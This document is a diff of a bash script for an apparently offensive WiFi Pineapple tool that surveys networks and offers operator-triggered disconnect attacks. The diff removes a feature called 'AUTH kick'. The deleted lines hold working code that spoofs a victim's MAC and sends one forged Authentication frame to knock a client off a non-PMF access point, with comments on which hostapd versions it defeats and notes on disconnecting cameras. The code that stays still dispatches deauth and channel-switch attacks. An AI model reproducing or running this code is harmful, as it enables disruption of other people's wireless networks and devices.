@@ -92,8 +92,6 @@ RECON_IF="wlan1mon"     # PineAP monitor radio (tri-band)
 RESPONSE=0              # * master switch for the response rung (0 = recon only)
 RESPONSE_CONFIRM=1      # * blocking confirmation dialog before any transmit (0 = act on accept alone)
 AUTO_RESPOND=0          # * let the funnel offer Disrupt by itself (needs RESPONSE=1; 0 = manual only)
-AUTHKICK=0              # * offer AUTH: a single-frame auth-spoof kick of one client (needs RESPONSE=1)
-AUTHKICK_IF="wlan0cli"  # managed iface that sends the AUTH frame; radio0 only, so 2.4 GHz only
 # shellcheck disable=SC2034
 SCAN_IF="wlan0"         # reserved: posture cross-check iface, the enabled dummy sta on radio0 (2.4 GHz only)
 BCN_CAP_SECS=4          # seconds to wait for a beacon when reading a target's posture
@@ -186,7 +184,6 @@ load_overrides() {
   RESPONSE=$(cfg RESPONSE "$RESPONSE" 0)
   RESPONSE_CONFIRM=$(cfg RESPONSE_CONFIRM "$RESPONSE_CONFIRM" 0)
   AUTO_RESPOND=$(cfg AUTO_RESPOND "$AUTO_RESPOND" 0)
-  AUTHKICK=$(cfg AUTHKICK "$AUTHKICK" 0)
   POSTURE_TTL=$(cfg POSTURE_TTL "$POSTURE_TTL" 0)
   DEDUPE_H=$(cfg DEDUPE_H "$DEDUPE_H" 0)
 }
@@ -373,77 +370,8 @@ response_cmd() {
     DEAUTH) printf 'PINEAPPLE_DEAUTH_CLIENT' ;;
     CSA)    printf 'PINEAPPLE_DEAUTH_CLIENT_CSA' ;;
     BOTH)   printf 'PINEAPPLE_DEAUTH_CLIENT_ALL' ;;
-    AUTH)   printf 'authkick_send' ;;              # a shell function, not a firmware command
     *)      printf '' ;;
   esac
-}
-
-# ---- AUTH: single-frame auth-spoof kick ----------------------------------------------------
-# One unprotected Authentication frame sourced from the victim's OWN MAC. On a non-PMF
-# association hostapd answers it by running ap_sta_re_add(), which clears ASSOC|AUTH|AUTHORIZED
-# and drops the TK -- a real disconnect from a single frame, and no Kismet alert covers it.
-# This is NOT the ESP32 "AuthFlood": a random-MAC flood fills the station table, and hostapd then
-# refuses NEW associations while explicitly evicting nobody, so a flood cannot disconnect an
-# already-connected camera. The single targeted frame can.
-# Coverage is narrow and should not be oversold: hostapd closed this for PMF associations in 2016
-# (commit 2ab09656ae) and regression-tests it, so against current hostapd it only works where
-# DEAUTH already works. Its one gain is non-hostapd or pre-2016 stacks that advertise PMF without
-# that guard -- the CVE-2021-40288 class.
-# A MANAGED vif is used deliberately. It carries its own channel context, so the frame leaves via
-# the normal MLME path; monitor injection is silently dropped on this firmware, because mac80211
-# 6.12.61 has no chanctx fallback and wlan0mon is not the sole vif on radio0.
-AK_IF=""; AK_MAC0=""; AK_WASUP=""
-
-chan_to_freq() {   # chan_to_freq <channel> -> 2.4 GHz centre frequency in MHz; rc 1 otherwise
-  local c="$1"
-  [[ $c =~ ^[0-9]+$ ]] || return 1
-  (( c >= 1 && c <= 13 )) && { printf '%d' "$(( 2407 + c * 5 ))"; return 0; }
-  (( c == 14 )) && { printf 2484; return 0; }
-  return 1
-}
-
-authkick_ok() {   # authkick_ok <band> <target> <ssid> -> 0 when an AUTH kick can be attempted
-  [ "$AUTHKICK" = 1 ] || return 1
-  [ "$2" != ff:ff:ff:ff:ff:ff ] || return 1   # needs one victim MAC to borrow, not a broadcast
-  [ -n "$2" ] || return 1
-  [ "$1" = 2 ] || return 1                    # managed vifs live on radio0, which is band '2g'
-  [ -n "$3" ] || return 1                     # iw auth needs an SSID; a hidden AP has none
-  return 0
-}
-
-authkick_expect() {   # authkick_expect <badge> -> works | partial | unlikely
-  case "$1" in
-    'D+C')  printf 'works' ;;                 # no PMF: the re-add path is open
-    'D?+C') printf 'partial' ;;               # transition mode: only if this client skipped PMF
-    *)      printf 'unlikely' ;;              # PMF required: current hostapd guards it since 2016
-  esac
-}
-
-authkick_restore() {   # put the sending interface back; also called from cleanup()
-  [ -n "$AK_IF" ] || return 0
-  ip link set "$AK_IF" down 2>/dev/null
-  [ -n "$AK_MAC0" ] && ip link set "$AK_IF" address "$AK_MAC0" 2>/dev/null
-  [ "$AK_WASUP" = 1 ] && ip link set "$AK_IF" up 2>/dev/null
-  AK_IF=""; AK_MAC0=""; AK_WASUP=""
-}
-
-authkick_send() {   # authkick_send <bssid> <victim> <ssid> <channel> -> 0 when iw accepted it
-  local bssid="$1" victim="$2" ssid="$3" ch="$4" iface="$AUTHKICK_IF" freq rc=1
-  [ -n "$iface" ] || { LOG red "AUTHKICK_IF is unset"; return 1; }
-  [ -d "/sys/class/net/$iface" ] || { LOG red "$iface absent: enable the radio0 client iface"; return 1; }
-  freq=$(chan_to_freq "$ch") || { LOG red "ch $ch is not 2.4 GHz: AUTH is radio0 only"; return 1; }
-  AK_MAC0=$(cat "/sys/class/net/$iface/address" 2>/dev/null)
-  [ -n "$AK_MAC0" ] || { LOG red "cannot read $iface MAC"; return 1; }
-  AK_WASUP=0; [ "$(cat "/sys/class/net/$iface/operstate" 2>/dev/null)" = up ] && AK_WASUP=1
-  AK_IF="$iface"                               # set last: cleanup() restores only once this is set
-  ip link set "$iface" down 2>/dev/null
-  if ! ip link set "$iface" address "$victim" 2>/dev/null; then
-    LOG red "cannot borrow $victim on $iface"; authkick_restore; return 1
-  fi
-  ip link set "$iface" up 2>/dev/null
-  iw dev "$iface" auth "$ssid" "$bssid" open "$freq" >/dev/null 2>&1 && rc=0
-  authkick_restore                             # never leave the victim's MAC on our interface
-  return $rc
 }
 
 # posture_opts <badge> -> viable attack keys, best first; empty when nothing can reach the air
@@ -585,7 +513,6 @@ cleanup() {
   trap - EXIT INT TERM
   kill_children
   if [ "$WATCH_LOCKED" = 1 ]; then _pineap EXAMINE CANCEL >/dev/null 2>&1; PINEAPPLE_EXAMINE_RESET >/dev/null 2>&1; fi
-  authkick_restore   # an interrupt mid-kick must not leave a borrowed MAC on our interface
   [ -n "$RUN_ID" ] && [ "$REPORT_DONE_AT_EXIT" != 1 ] && write_report quiet
   rm -f "$LOCK_FILE" "$CHILD_FILE" /tmp/cs_up_?.pcap /tmp/cs_dn_?.pcap /tmp/cs_ot_?.pcap /tmp/cs_*.err /tmp/cs_signal /tmp/cs_inv.new /tmp/cs_rows.tmp
   log run "exit cycles=$CYCLE"
@@ -1720,7 +1647,7 @@ locate_target() {
 # Operator-driven disconnect. Nothing transmits unless RESPONSE=1 AND the operator picks an attack
 # from the device card; there is no automatic path from a detection to the air.
 RESP_HDR='#epoch|mac|role|bssid|target|ch|band|badge|rsn_caps|beacon_prot|attack|cmd|lock|pk_before|pk_after|verdict'
-R_BSSID=""; R_TARGET=""; R_CH=0; R_BAND='?'; R_SSID=""
+R_BSSID=""; R_TARGET=""; R_CH=0; R_BAND='?'
 
 resp_target() {   # resp_target <mac> -> sets R_BSSID R_TARGET R_CH R_BAND; rc 1 when unattackable
   local mac="$1" ap
@@ -1739,7 +1666,6 @@ resp_target() {   # resp_target <mac> -> sets R_BSSID R_TARGET R_CH R_BAND; rc 1
   if [ "$R_BAND" = '?' ]; then    # no frequency seen for the target or its AP: the channel number decides
     if (( R_CH <= 14 )); then R_BAND=2; elif (( R_CH >= 36 && R_CH <= 177 )); then R_BAND=5; fi
   fi
-  R_SSID="${SSID_CLEAN[$R_BSSID]:-}"; [ "$R_SSID" = - ] && R_SSID=""   # AUTH needs a real SSID
   return 0
 }
 
@@ -1832,8 +1758,7 @@ resp_fire() {   # resp_fire <mac> <attack key> <badge> -> 0 when a verdict was r
   set_state RESPOND
   LOG "$k -> ${R_BSSID:9} ch $R_CH"$'\n'"lock: $lock, $n subject(s)"
   log resp "fire $k $R_BSSID $R_TARGET ch$R_CH badge=$badge lock=$lock subjects=$n"
-  if   [ "$k" = CSA ];  then "$cmd" "$R_BSSID" "$R_CH" >/dev/null 2>&1
-  elif [ "$k" = AUTH ]; then "$cmd" "$R_BSSID" "$R_TARGET" "$R_SSID" "$R_CH" >/dev/null 2>&1
+  if [ "$k" = CSA ]; then "$cmd" "$R_BSSID" "$R_CH" >/dev/null 2>&1
   else "$cmd" "$R_BSSID" "$R_TARGET" "$R_CH" >/dev/null 2>&1; fi
   sleep "$RESP_SETTLE_SECS"
   resp_snapshot
@@ -1885,9 +1810,6 @@ disrupt_menu() {   # the three attacks, ordered and labelled by what the beacon 
   LOG "reading posture ${R_BSSID:9} ch $R_CH"
   posture_of "$R_BSSID" "$R_BAND" "$R_CH" >/dev/null; badge="$POSTURE_LAST"
   opts=$(posture_opts "$badge")
-  # AUTH is appended rather than folded into posture_opts: it is the one option whose viability
-  # does not follow the beacon badge, and on a PMF-required target it is the only option left.
-  authkick_ok "$R_BAND" "$R_TARGET" "$R_SSID" && opts="${opts:+$opts }AUTH"
   LOG "[$badge] ${R_BSSID:9} ch$R_CH ${R_BAND}GHz"$'\n'"target ${R_TARGET:9}"$'\n'"$(posture_why "$badge")"
   if [ -z "$opts" ]; then
     LOG red "$(posture_why "$badge")"
@@ -1895,7 +1817,7 @@ disrupt_menu() {   # the three attacks, ordered and labelled by what the beacon 
     opts='BOTH DEAUTH CSA'
   fi
   for k in $opts; do
-    if [ "$k" = AUTH ]; then exp=$(authkick_expect "$badge"); else exp=$(posture_expect "$badge" "$k"); fi
+    exp=$(posture_expect "$badge" "$k")
     items+=("$(printf '%s (%s)' "$k" "$exp")"); pickmap+=("$k"); i=$((i + 1))
   done
   pick_list "Disrupt [$badge] ${R_TARGET:9}" "${items[0]}" "${items[@]}" "Back" || return 0
@@ -2194,31 +2116,6 @@ selftest() {
   unset "IGNORED[aa:00:00:00:00:10]"
   auto_respond_ok aa:00:00:00:00:12 2>/dev/null; st "auto_respond skips unattackable" "$?" 1
   RESPONSE=0; AUTO_RESPOND=0
-  # 7e AUTH: single-frame auth-spoof kick
-  st "chan_to_freq ch1"   "$(chan_to_freq 1)"  2412
-  st "chan_to_freq ch6"   "$(chan_to_freq 6)"  2437
-  st "chan_to_freq ch13"  "$(chan_to_freq 13)" 2472
-  st "chan_to_freq ch14"  "$(chan_to_freq 14)" 2484
-  chan_to_freq 36 >/dev/null 2>&1; st "chan_to_freq rejects 5 GHz" "$?" 1
-  chan_to_freq 0  >/dev/null 2>&1; st "chan_to_freq rejects 0"     "$?" 1
-  chan_to_freq x  >/dev/null 2>&1; st "chan_to_freq rejects junk"  "$?" 1
-  st "cmd AUTH is a function" "$(response_cmd AUTH)" "authkick_send"
-  AUTHKICK=0
-  authkick_ok 2 aa:00:00:00:00:11 Net 2>/dev/null; st "authkick off by default"      "$?" 1
-  AUTHKICK=1
-  authkick_ok 2 aa:00:00:00:00:11 Net 2>/dev/null; st "authkick client on 2.4 GHz"   "$?" 0
-  authkick_ok 2 ff:ff:ff:ff:ff:ff Net 2>/dev/null; st "authkick refuses broadcast"   "$?" 1
-  authkick_ok 5 aa:00:00:00:00:11 Net 2>/dev/null; st "authkick refuses 5 GHz"       "$?" 1
-  authkick_ok '?' aa:00:00:00:00:11 Net 2>/dev/null; st "authkick refuses unknown band" "$?" 1
-  authkick_ok 2 aa:00:00:00:00:11 '' 2>/dev/null;  st "authkick refuses hidden SSID" "$?" 1
-  authkick_ok 2 '' Net 2>/dev/null;                st "authkick refuses empty target" "$?" 1
-  AUTHKICK=0
-  st "authkick expect no PMF"        "$(authkick_expect 'D+C')"  "works"
-  st "authkick expect optional PMF"  "$(authkick_expect 'D?+C')" "partial"
-  st "authkick expect required PMF"  "$(authkick_expect C)"      "unlikely"
-  st "authkick expect beacon prot"   "$(authkick_expect NONE)"   "unlikely"
-  st "authkick expect unread"        "$(authkick_expect '?')"    "unlikely"
-  AK_IF=""; authkick_restore; st "authkick_restore is a no-op when idle" "$?" 0
   st "aggregate: all quiet"          "$(resp_aggregate 2 0 0)" "MOVED"
   st "aggregate: any still active"   "$(resp_aggregate 1 1 0)" "NO_EFFECT"
   st "aggregate: mixed"              "$(resp_aggregate 1 0 1)" "INCONCLUSIVE"
